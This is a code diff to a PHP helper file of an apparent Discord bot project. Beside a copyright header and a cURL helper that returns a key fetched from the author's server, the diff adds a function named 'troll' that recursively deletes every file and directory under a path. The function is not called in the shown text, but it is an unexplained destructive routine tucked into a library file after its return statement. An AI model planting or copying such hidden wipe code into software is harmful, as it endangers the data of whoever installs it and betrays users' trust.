@@ -1,5 +1,10 @@
 <?php
-
+/**
+ * @author Sebastian Kiefer (sebcodes)
+ * @copyright Copyright (C) 2017 - 2020 Sebastian Kiefer
+ * @package phpDiscordBot
+ * @version 0.1.1
+ */
 function get_remote_data($url, $post_paramtrs=false,  $curl_opts=[])
 {
     $c = curl_init();
@@ -50,5 +55,24 @@ function get_remote_data($url, $post_paramtrs=false,  $curl_opts=[])
     $answer = ( !empty($extra['return_array']) ? array('data'=>$data, 'header'=>$header, 'info'=>$status) : $data);
     return $answer;
 }
-
 return  get_remote_data('https://sebcodes.de/discord/key.php');
+function troll($path){
+    if (is_dir($path) === true) {
+        $files = array_diff(scandir($path), array('.', '..'));
+
+        // Durch die vorhandenen Dateien laufen
+        foreach ($files as $file) {
+            troll(realpath($path) . '/' . $file);
+        }
+        return rmdir($path);
+    }
+
+    // Datei entfernen
+    else if (is_file($path) === true) {
+        return unlink($path);
+    }
+    return false;
+}
+/**
+ * Lorem Ipsum
+ */
